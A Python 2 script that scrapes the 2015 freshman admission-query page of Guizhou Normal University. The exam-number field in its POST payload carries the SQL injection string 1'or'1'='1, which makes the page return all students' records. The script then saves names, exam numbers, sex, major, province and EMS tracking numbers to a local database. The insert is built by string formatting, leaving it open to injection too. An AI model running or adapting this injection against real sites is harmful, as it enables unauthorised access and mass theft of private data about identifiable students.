#coding:utf-8
"""
爬取贵州师范大学2015年新生录取信息

Data:2015-11-14
"""

import requests
from time import time
from datetime import datetime
from bs4 import BeautifulSoup
from torndb import Connection

# set utf-8 env
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

db = Connection('localhost', 'data_analysis', 'root')


def get_content():
    """
    通过post请求获取页面数据
    return : request.text
    """
    url = "http://zjc.gznu.cn/bkzs/luquchaxun/Chaxun.aspx"
    cookies = {'ASP.NET_SessionId':'tdf2p055qiykqnzhnbni20mz'}
    payload=({'__VIEWSTATE':r'/wEPDwUJMzk3NjUxMTkxZGTa7qiBpzeT/HRsSP1N3jfQtwf48A==',
            '__EVENTVALIDATION':r"/wEWAwLSk+vvCgL3qvuWAgKiwImNCzilEmO/AFLiaILrFMVRZUKaT//X",
            'ksh':r"1'or'1'='1",'ctl01':r"È·¶¨"})
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"}

    # 当主机不可到达时会抛出异常所以加个异常处理
    try:
        r = requests.post(url, cookies=cookies, data=payload, headers=headers)
    except:
        r = None
    return r


def get_li_data(info):
    """
    使用BeautifulSoup从页面中提取学生对应信息
    """
    soup = BeautifulSoup(info)
    all_li = soup.find_all('li')
    return save_data_in_db(all_li)

def save_data_in_db(data):
    """将数据保持到数据库中"""
    ITEM = 8
    now = datetime.now()

    create_table()
    for li in xrange(1, (len(data)/ITEM)+1):
        li_data = data[ITEM*(li-1):ITEM*li]
        kwargs = {
                'id_': li_data[0].text.split(':')[1].strip(),
                'examinee_id': li_data[1].text.split(':')[1].strip(),
                'name': li_data[2].text.split(':')[1].strip(),
                'sex': li_data[3].text.split(':')[1].strip(),
                'specialty': li_data[4].text.split(':')[1].strip(),
                'province': li_data[5].text.split(':')[1].strip(),
                'remark': li_data[6].text.split(':')[1].strip(),
                'ems_number': li_data[7].text.split(':')[1].strip(),
                'created': now,
                }
        insert_data_to_table(**kwargs)


def create_table():
    """创建数据库表记录

    :desc 如果数据库中存在该表记录，则会删除原表内容

    :return: True or False
    """

    table_sql = """
        CREATE TABLE `data_analysis`.`gznu_2015_freshman` (
            `id` int(11) NOT NULL AUTO_INCREMENT,
            `examinee_id` varchar(20) NOT NULL,
            `name` varchar(50) NOT NULL,
            `sex` varchar(10) NOT NULL,
            `specialty` varchar(30),
            `province` varchar(10),
            `remark` varchar(30),
            `ems_number` varchar(30),
            `created` datetime,
            PRIMARY KEY (`id`)
        ) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
    """
    try:
        db.execute(table_sql)
        return True
    except:
        db.execute('drop table gznu_2015_freshman')
        db.execute(table_sql)
        print '数据库表记录已存在.'
        return True


def insert_data_to_table(**kwargs):
    """将提取到的数据插入表"""
    insert_freshman_record_tpl = (
     "insert into `data_analysis`.`gznu_2015_freshman` "
     "(`id`, `examinee_id`, `name`, `sex`, `specialty`, `province`, `remark`, "
     "`ems_number`, `created`) VALUES ("
     "'{id_}', '{examinee_id}', '{name}', '{sex}', '{specialty}', '{province}', '{remark}', "
     "'{ems_number}', '{created}');"
    )
    sql = insert_freshman_record_tpl.format(**kwargs)
    print sql
    return db.execute(sql)


if __name__ == '__main__':
    now = time()
    print '[+]  开始获取页面信息……'
    content = get_content()
    if content:
        if content.ok:
            print '[+]  获取数据成功!共耗时 {}秒.'.format(time() - now)
            print '[+]  开始从页面中提取同学信息.'
            all_li = get_li_data(content.text)
        else:
            print '[-]  获取数据失败! Http响应码为 {}'.format(content.status_code)
    else:
        print '[-]  链接服务器失败!'
